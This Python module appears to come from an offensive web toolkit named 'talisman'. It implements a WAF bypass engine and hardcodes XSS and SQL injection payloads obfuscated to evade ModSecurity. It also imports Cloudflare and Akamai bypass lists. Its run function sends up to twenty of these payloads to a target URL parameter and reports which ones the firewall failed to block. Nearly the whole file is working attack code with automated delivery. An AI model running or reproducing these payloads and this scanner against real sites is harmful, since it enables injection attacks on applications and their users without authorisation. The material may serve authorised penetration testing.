"""Universal WAF bypass engine — vendor-aware payload mutation."""
from __future__ import annotations
import asyncio
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.payload_engine import PayloadEngine
from talisman.modules.waf.vendors import cloudflare, akamai
from talisman.utils.logger import get_logger, console

log = get_logger(__name__)

MODSECURITY_XSS_BYPASSES = [
    "<img\rsrc=x\ronerror=alert(1)>",
    "<img\tsrc=x\tonerror=alert(1)>",
    "<img src onerror=alert(1)>",
    "<script>onerror=alert;throw 1</script>",
    "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",
    "<details/open/ontoggle=alert(1)>",
]

MODSECURITY_SQLI_BYPASSES = [
    "1/**/UNION/**/SELECT/**/1,2,3",
    "1%0bUNION%0bSELECT%0b1",
    "1\x0cUNION\x0cSELECT\x0c1",
    "1.0 UNION SELECT 1e0,2e0,3e0--",
    "1||1=1",
    "1&&1=1",
]

VENDOR_BYPASS_MAP: dict[str, dict[str, list[str]]] = {
    "Cloudflare": {
        "xss": cloudflare.get_xss_bypasses(),
        "sqli": cloudflare.get_sqli_bypasses(),
    },
    "Akamai": {
        "xss": akamai.get_xss_bypasses(),
        "sqli": akamai.get_sqli_bypasses(),
        "lfi": akamai.get_traversal_bypasses(),
    },
    "ModSecurity": {
        "xss": MODSECURITY_XSS_BYPASSES,
        "sqli": MODSECURITY_SQLI_BYPASSES,
    },
}


async def _score_payload(
    url: str, param: str, payload: str, client: TalismanHTTPClient
) -> dict[str, Any]:
    import urllib.parse
    parsed = urllib.parse.urlparse(url)
    base = dict(urllib.parse.parse_qsl(parsed.query))
    test_params = {**base, param: payload}
    test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
    try:
        r = await client.get(test_url, timeout=10)
        blocked = r.status_code in (403, 406, 429, 503)
        waf_page = any(
            kw in r.text.lower()
            for kw in ["blocked", "forbidden", "access denied", "cloudflare", "incapsula"]
        )
        passed = not blocked and not waf_page
        return {
            "payload": payload,
            "param": param,
            "status": r.status_code,
            "passed": passed,
            "blocked": blocked or waf_page,
        }
    except Exception as e:
        return {"payload": payload, "param": param, "status": 0, "passed": False, "blocked": False, "error": str(e)}


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    waf: str = "auto",
    vuln_type: str = "xss",
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module]⚡ WAF Bypass Engine[/module] → [target]{url}[/target] ({waf})")

    if waf == "auto" or waf not in VENDOR_BYPASS_MAP:
        # Use generic payloads
        from talisman.utils.payload_engine import XSS_PAYLOADS, SQLI_PAYLOADS
        payloads = (
            XSS_PAYLOADS.get("waf_bypass", []) if vuln_type == "xss"
            else SQLI_PAYLOADS.get("waf_bypass", [])
        )
    else:
        payloads = VENDOR_BYPASS_MAP.get(waf, {}).get(vuln_type, [])

    if not payloads:
        console.print("  [dim]No vendor-specific bypasses available[/dim]")
        return {"target": url, "bypasses": [], "waf": waf}

    # Test each bypass payload and score
    import urllib.parse
    param = kwargs.get("param", "q")
    passed: list[dict[str, Any]] = []

    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
        tasks = [_score_payload(url, param, p, client) for p in payloads[:20]]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, dict) and r.get("passed"):
                passed.append(r)
                console.print(f"  [success]✓ Bypass passed:[/success] {r['payload'][:80]}")

    console.print(f"  {len(passed)}/{len(payloads)} payloads bypassed WAF")
    return {
        "target": url,
        "waf": waf,
        "vuln_type": vuln_type,
        "tested": len(payloads),
        "bypasses": passed,
    }
